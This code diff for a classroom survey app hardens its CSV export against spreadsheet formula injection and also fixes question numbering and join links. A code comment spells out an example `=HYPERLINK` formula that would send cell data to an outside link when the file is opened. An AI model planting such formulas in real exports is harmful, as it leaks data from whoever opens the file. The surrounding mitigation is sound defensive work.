@@ -1419,9 +1419,26 @@ export function computeDelta(before, after) {
 // CSV export (proposal P5 — never paywalled, never identifying)
 // =====================================================================
 
+/**
+ * Cells a spreadsheet would run as a formula rather than read as text.
+ *
+ * The whole point of this export is "open it in Excel", and an open-ended
+ * answer is a box a student types anything into. `=HYPERLINK("http://…"&A1,
+ * "Grades")` typed into that box is a live link that fires when the
+ * instructor opens the file — quoting the cell does not stop it, because
+ * the quotes are stripped before the formula is evaluated.
+ *
+ * A leading apostrophe is the standard mitigation: Excel, LibreOffice and
+ * Sheets all read it as "this cell is text" and do not show it. Plain
+ * negative numbers are left alone, so a numeric column stays numeric.
+ */
+const CSV_FORMULA_START = /^[=+\-@\t\r]/;
+const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;
+
 export function toCSVValue(v) {
   if (v == null) return '';
-  const s = String(v);
+  let s = String(v);
+  if (CSV_FORMULA_START.test(s) && !PLAIN_NUMBER.test(s)) s = `'${s}`;
   return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
@@ -1604,13 +1621,22 @@ export function answerCorrectness(type, config, payload) {
  */
 export function sessionToCSVRows(session, questions, responses) {
   const byId = new Map(questions.map((q) => [q.id, q]));
+  // The same numbering the projector and every phone showed. A deck that
+  // opens with an instructions slide told the room "Question 1 of 8"; the
+  // export has to say question 1 too, or the instructor cannot match a
+  // row to the question they remember asking. Content slides collect no
+  // responses, so they only appear here as a defensive 0.
+  const numbers = new Map();
+  sortedQuestions(questions)
+    .filter((q) => !isContentSlide(q.type))
+    .forEach((q, i) => numbers.set(q.id, i + 1));
   const out = [];
   for (const r of responses) {
     const q = byId.get(r.question_id);
     if (!q) continue;
     out.push({
       session: session?.label || session?.join_code || '',
-      question_number: (q.position ?? 0) + 1,
+      question_number: numbers.get(q.id) ?? 0,
       question_type: TYPE_LABELS[q.type] || q.type,
       question: q.prompt,
       round: r.round,
@@ -1695,7 +1721,28 @@ export function generateJoinCode(len = 6, rnd = Math.random) {
   return out;
 }
 
+/**
+ * The one join link, used for the QR, for what the projector prints, and
+ * for anything handed to a student.
+ *
+ * `/join` rather than `/join.html`: the extensionless path is what every
+ * screen tells the room to type, and a QR that resolved somewhere else —
+ * even to the same page — is a second address for one door. The Worker
+ * serves join.html there (see worker/index.js and .assetsignore), as does
+ * GitHub Pages for a static mirror.
+ */
 export function joinURL(baseURL, code) {
   const base = String(baseURL || '').replace(/\/+$/, '');
-  return `${base}/join.html#${encodeURIComponent(code)}`;
+  return `${base}/join#${encodeURIComponent(code)}`;
+}
+
+/**
+ * The same link with the parts a person does not type removed: no
+ * scheme, no code fragment. Deliberately keeps the `/join` path — the
+ * projector used to print a bare host, so the room was told to go to
+ * "surveyall.org" while the QR and every other screen said
+ * "surveyall.org/join".
+ */
+export function joinURLPretty(baseURL, code) {
+  return joinURL(baseURL, code).replace(/^https?:\/\//, '').replace(/#.*$/, '');
 }
